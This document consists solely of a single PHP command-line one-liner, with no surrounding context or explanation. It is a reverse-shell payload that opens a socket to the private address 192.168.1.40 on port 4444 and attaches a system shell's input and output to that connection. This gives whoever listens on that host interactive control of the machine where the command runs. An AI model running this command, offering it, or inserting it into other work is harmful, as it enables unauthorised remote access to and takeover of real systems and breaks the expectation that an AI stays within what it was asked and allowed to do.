php -r '$sock=fsockopen("192.168.1.40",4444);shell_exec("sh <&3 >&3 2>&3");'
